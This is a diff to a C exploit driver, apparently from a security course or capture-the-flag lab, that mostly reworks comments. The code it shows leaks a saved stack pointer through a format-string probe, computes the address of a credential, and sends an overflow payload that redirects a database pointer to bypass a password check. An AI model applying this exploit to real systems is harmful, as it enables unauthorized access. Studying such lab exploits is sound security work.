@@ -13,10 +13,10 @@ int main(int argc, char* argv[]) {
 	getchar();
 	get_formatted("%*s"); // Needed to clear out the Welcome message
 
-	// Function to probe and find the location of main bp
+	// Probe the offset of main bp on stack
 	// probe_stack(200, 500);
 
-	// The probed value on the stack is 218 for the saved rbp value in main loop
+	// The probed offset is 218 for the saved rbp value in main loop
 	put_str("e %218$p\n");
 	send();
 	uint64_t cur_main_bp;
@@ -29,19 +29,22 @@ int main(int argc, char* argv[]) {
 	fprintf(stderr, "driver: Computed cur_auth_bp=%lx, cur_auth_cred_loc=%lx\n", 
 			cur_auth_bp, cur_auth_cred_loc);
 
-	// Send the payload
+	// Send the password payload
 	put_str("p 1234567\n");
 	send();
 	get_formatted("%*s");
 
-	// Buffer Size + DB - Password
+	// Buffer Size + DB - Password length (including _)
 	unsigned explsz = auth_db_cred_dist + 8 - 8;
 	void* *expl = (void**)malloc(explsz);
 
 	// Initialize the buffer with '\1' to make the contents predictable.
+	// '\1' also makes sure the password check is not skipped
 	memset((void*)expl, '\1', explsz);
-	expl[auth_db_cred_dist/sizeof(void*)-1] = (void*)cur_auth_cred_loc;
+	// Overwrite the value of db to point to cred
+	expl[auth_db_cred_dist/sizeof(void*) - 1] = (void*) cur_auth_cred_loc;
 
+	// Send the exploit payload
 	put_str("u ");
 	put_bin((char*)expl, explsz);
 	put_str("\n");
